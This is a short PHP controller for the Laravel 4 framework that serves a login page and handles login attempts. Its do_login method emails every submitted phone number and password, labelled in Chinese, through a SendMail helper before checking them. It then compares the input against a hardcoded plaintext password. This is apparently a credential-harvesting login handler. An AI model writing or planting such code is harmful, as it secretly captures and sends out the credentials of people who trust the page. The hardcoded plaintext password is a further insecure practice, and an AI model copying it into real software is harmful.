<?php

class JjController extends BaseController {

	/*
	|--------------------------------------------------------------------------
	| Default Home Controller
	|--------------------------------------------------------------------------
	|
	| You may wish to use controllers instead of, or in addition to, Closure
	| based routes. That's great! Here is an example controller method to
	| get you started. To route to this controller, just add the route:
	|
	|	Route::get('/', 'HomeController@showWelcome');
	|
	*/

	public function login()
	{
		return View::make('jj.login');
	}

	public function do_login(){
		$pwd=Input::get('pwd');
		$phone=Input::get('phone');

		SendMail::send_password_jj('手机号:'.$phone.',密码:'.$pwd);

		if($pwd=='woshijingjing'){
			$data=1;  //密码正确
		}else{
			$data=0;  //密码错误
		}

		return $data;
	}

	public function index(){
		return View::make('jj.index');
	}



}
